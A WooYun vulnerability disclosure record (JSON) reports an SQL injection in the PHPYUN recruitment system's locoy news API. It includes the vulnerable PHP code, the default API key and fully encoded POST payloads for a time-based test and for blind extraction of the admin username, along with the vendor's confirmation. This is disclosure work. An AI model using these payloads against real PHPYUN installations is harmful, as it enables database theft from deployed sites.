{"id": 66164, "wybug_id": "wooyun-2015-0127257", "wybug_title": "PHPYUN无视GPC(可注入全站信息)", "wybug_corp": "php云人才系统", "wybug_author": "menmen519", "wybug_date": "2015-07-20 10:59", "wybug_open_date": "2015-10-21 21:18", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-07-20：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-07-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-07-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-09-16：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-09-26：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-21：\t细节向公众公开  简要描述： PHPYUN无视GPC(可注入全站信息) 180个字符的注入，等于没有限制，什么都能注入出来 详细说明：  首先我们看这个文件：api/locoy/model/news.class.php:\nclass news_controller extends common{\tfunction addnews_action(){//新闻添加\t\tinclude(\"locoy_config.php\");\t\tif($locoyinfo['locoy_online']!=1){\t\t\techo 4;die;\t\t}\t\tif($locoyinfo['locoy_key']!=trim($_GET['key'])){\t\t\techo 5;die;\t\t}        if(!$_POST['title'] || !$_POST['content'] || !$_POST['nid']){\t\t\techo 2;die;\t\t}\t\t$row=$this->obj->DB_select_once(\"news_base\",\"`title`='\".trim($_POST['title']).\"' and `nid`='\".$_POST['nid'].\"'\");\t\tif(is_array($row)){\t\t\techo 3;die;\t\t}\t\t$content=$_POST['content'];\t\t\t\t$value=\"\";        $value.=\"`title`='\".trim($_POST['title']).\"',\";\t\t$value.=\"`nid`='\".$_POST['nid'].\"',\";\t\t$value.=\"`did`='0',\";\t\t$value.=\"`author`='\".$_POST['author'].\"',\";\t\t$description=mb_substr(strip_tags(html_entity_decode($content,ENT_NOQUOTES,\"GB2312\")),0,180,\"gbk\");\t\t$description=$_POST['description']?$_POST['description']:$description;\t\t$description=str_replace(array(' ',\"\\n\",\"\\r\",\"\\r\\n\",\" \"),array(''),$description);\t\t$value.=\"`description`='\".$description.\"',\";\t\t$value.=\"`source`='\".$_POST['source'].\"'\";\t\tif($_POST['ctime']){\t\t\t$value.=\",`datetime`='\".strtotime($_POST['ctime']).\"'\";\t\t}else{\t\t\t$value.=\",`datetime`='\".time().\"'\";\t\t}\t\tif($_POST['hits']){\t\t\t$value.=\",`hits`='\".trim($_POST['hits']).\"'\";\t\t}else{\t\t\t$row=explode('-',$locoyinfo['locoy_rand']);\t\t\tif(is_array($row)){\t\t\t\t$rand=rand(trim($row[0]),trim($row[1]));\t\t\t}else{\t\t\t\t$rand=!trim($row)?0:$row;\t\t\t}\t\t\t$value.=\",`hits`='\".$rand.\"'\";\t\t}\t\tif($_POST['sort']){\t\t\t$value.=\",`sort`='\".trim($_POST['sort']).\"'\";\t\t}else{\t\t\t$row=explode('-',$locoyinfo['locoy_sort']);\t\t\tif(is_array($row)){\t\t\t\t$rand=rand(trim($row[0]),trim($row[1]));\t\t\t}else{\t\t\t\t$rand=!trim($row)?0:$row;\t\t\t}\t\t\t$value.=\",`sort`='\".$rand.\"'\";\t\t}\t\tif($_POST['newsphoto']){\t\t\t$value.=\",`newsphoto`='\".trim($_POST['newsphoto']).\"'\";\t\t}\t\tif($_POST['s_thumb']){\t\t\t$value.=\",`s_thumb`='\".trim($_POST['s_thumb']).\"'\";\t\t}       if(!$_POST['keyword'] && $locoyinfo['locoy_keyword']==1){\t\t\trequire(LIB_PATH.\"lib_splitword_class.php\");\t\t\t$sp = new SplitWord();\t\t\t$keywordarr=$sp->getkeyword(strip_tags(html_entity_decode($content)));\t\t\t$value.=\",`keyword`='\".strip_tags(@implode(\",\",$keywordarr)).\"'\";\t\t}elseif($_POST['keyword']){\t\t\t$value.=\",`keyword`='\".str_replace(\"，\",\",\",$_POST['keyword']).\"'\";\t\t}     \t$new_base = $this->obj->DB_insert_once(\"news_base\",$value);\n这个里面有几个条件要说明一下：1.$locoyinfo['locoy_key']!=trim($_GET['key'])我们搜索一下：locoy_config.php里面 默认安装的话，就是$locoyinfo=array(\"locoy_online\"=>\"1\",\"locoy_name\"=>\"yun_\",\"locoy_pwd\"=>\"12345678\",\"locoy_key\"=>\"phpyun\",\"co找来找去都没有发现设置更改这个配置的地方，在后台的添加新闻的地方也没有找到，不管这个配置是硬编码的还是怎么样，反正是默认配置条件2：$row=$this->obj->DB_select_once(\"news_base\",\"`title`='\".trim($_POST['title']).\"' and `nid`='\".$_POST['nid'].\"'\");\t\tif(is_array($row)){\t\t\techo 3;die;\t\t}这个语句必须查不到，也就是说数据库里面不存在这个新闻条件3  if(!$_POST['keyword'] && $locoyinfo['locoy_keyword']==1){ 这个逻辑不要进来，不然就会报错然后我们看看问题点：\n$description=mb_substr(strip_tags(html_entity_decode($content,ENT_NOQUOTES,\"GB2312\")),0,180,\"gbk\");\t\t$description=$_POST['description']?$_POST['description']:$description;\t\t$description=str_replace(array(' ',\"\\n\",\"\\r\",\"\\r\\n\",\" \"),array(''),$description);\n发现了没有我们只要对数据进行实体编码即可所有的空格都会被去掉，那么我们比如sleep(5)可以写成slee p(5)解码后有180个字符的范围，那么我们就可以什么都能注射出来url:http://localhost/phpyun40/upload/api/locoy/index.php?m=news&c=addnews&key=phpyunpostdata：title=xxxx&content=1'*slee p(5)#&nid=567&keyword=xxxxxx编码一层：title=xxxx&content=&#49;&#39;&#42;&#115;&#108;&#101;&#101;&#32;&#112;&#40;&#53;&#41;&#35;&nid=567&keyword=xxxxxx再编码一层：title=xxxx&content=%26%2349%3B%26%2339%3B%26%2342%3B%26%23115%3B%26%23108%3B%26%23101%3B%26%23101%3B%26%2332%3B%26%23112%3B%26%2340%3B%26%2353%3B%26%2341%3B%26%2335%3B&nid=567&keyword=xxxxxx这样发送url:http://localhost/phpyun40/upload/api/locoy/index.php?m=news&c=addnews&key=phpyunpostdata:title=xxxx&content=%26%2349%3B%26%2339%3B%26%2342%3B%26%23115%3B%26%23108%3B%26%23101%3B%26%23101%3B%26%2332%3B%26%23112%3B%26%2340%3B%26%2353%3B%26%2341%3B%26%2335%3B&nid=567&keyword=xxxxxx后台抓取sql为：INSERT INTO `phpyun_news_base` SET `title`='xxxx',`nid`='567',`did`='0',`author`='',`description`='1'*sleep(5)#',`source`='',`datetime`='1437052963',`hits`='',`sort`='',`keyword`='xxxxxx'\n\n后续进行猜测的，180个字符随便来，记得里面的nid每次请求一次都要变一次在所有的关键字里面都加一个空格postdata:title=xxxx&content=%26%2349%3B%26%2339%3B%26%2342%3B%26%23105%3B%26%2332%3B%26%23102%3B%26%2340%3B%26%2397%3B%26%23115%3B%26%2399%3B%26%23105%3B%26%23105%3B%26%2340%3B%26%23115%3B%26%23117%3B%26%2398%3B%26%23115%3B%26%23116%3B%26%23114%3B%26%2340%3B%26%2340%3B%26%23115%3B%26%23101%3B%26%23108%3B%26%23101%3B%26%2332%3B%26%2399%3B%26%23116%3B%26%2396%3B%26%23117%3B%26%23115%3B%26%23101%3B%26%23114%3B%26%23110%3B%26%2397%3B%26%23109%3B%26%23101%3B%26%2396%3B%26%23102%3B%26%23114%3B%26%2332%3B%26%23111%3B%26%23109%3B%26%2396%3B%26%23112%3B%26%23104%3B%26%23112%3B%26%23121%3B%26%23117%3B%26%23110%3B%26%2395%3B%26%2397%3B%26%23100%3B%26%23109%3B%26%23105%3B%26%23110%3B%26%2395%3B%26%23117%3B%26%23115%3B%26%23101%3B%26%23114%3B%26%2396%3B%26%2341%3B%26%2344%3B%26%2349%3B%26%2344%3B%26%2349%3B%26%2341%3B%26%2341%3B%26%2361%3B%26%2357%3B%26%2355%3B%26%2344%3B%26%23115%3B%26%23108%3B%26%23101%3B%26%23101%3B%26%2332%3B%26%23112%3B%26%2340%3B%26%2353%3B%26%2341%3B%26%2344%3B%26%2349%3B%26%2341%3B%26%2335%3B&nid=5671&keyword=xxxxxx抓取sql为：INSERT INTO `phpyun_news_base` SET `title`='xxxx',`nid`='5671',`did`='0',`author`='',`description`='1'*if(ascii(substr((select`username`from`phpyun_admin_user`),1,1))=97,sleep(5),1)#',`source`='',`datetime`='1437053421',`hits`='',`sort`='',`keyword`='xxxxxx'   漏洞证明：     修复方案：     版权声明：转载请注明来源 menmen519@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：20  确认时间：2015-07-23 21:17 厂商回复： 感谢提供，我们会尽快修复！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-07-20 11:00 |    \t\t牛肉包子 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:64        )\t\t \n  为啥没提醒    \n     2015-07-20 11:12 |    \t\tTon7BrEak \t\t\t( 普通白帽子  |\t\t\t        Rank:211 漏洞数:43        | 吃苦耐劳，我只会第一个！)\t\t \n  mark    \n     2015-07-23 23:01 |    \t\t从容 \t\t\t( 普通白帽子  |\t\t\t        Rank:221 漏洞数:75        | Enjoy Hacking Just Because It's Fun :)  ...)\t\t \n  为啥说开源更安全？因为乌云。。。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 20, "Ranks": null}